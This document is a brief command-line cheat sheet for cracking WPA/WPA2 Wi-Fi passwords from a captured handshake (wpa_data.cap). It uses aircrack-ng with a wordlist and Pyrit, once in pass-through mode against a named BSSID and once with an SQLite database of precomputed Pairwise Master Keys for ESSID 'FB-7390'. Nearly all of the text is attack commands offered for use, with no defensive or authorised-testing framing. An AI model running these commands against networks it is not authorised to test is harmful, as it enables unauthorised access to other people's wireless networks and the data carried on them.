# aircrack-ng -w wordlist.txt wpa_data.cap

# Analyse a capture file to find access points.
pyrit -r wpa_data.cap analyze


# Pyrit has two ways to attach WPA/WPA2 security:
#  - attack_passthrough: simple
#  - attack_db: is more involved as it required creating
#               creating a database where ESSIDs, passwords 
#               and their corresponding Pairwise Master Keys
#               are stored.

# Method 1: Attacking using pass-through
pyrit -r wpa_data.cap -i wordlist.txt -b bc:05:43:f9:3a:b6 attack_passthrough




# Method 2: Attacking using a database

# Create a database containing all passwords
pyrit -u sqlite:///mydb.db -i wordlist.txt import_passwords

# Create ESSID in the database
pyrit -u sqlite:///mydb.db -e "FB-7390" create_essid

# Check current information in the database
pyrit -u sqlite:///mydb.db eval

# Start the batch-processing task. If stopped, Pyrit will resume at the
# point where it stopped the next time you start batch-processing.
pyrit -u sqlite:///mydb.db batch

# Use the database to attack a handshake
pyrit -r wpa_data.cap attack_db
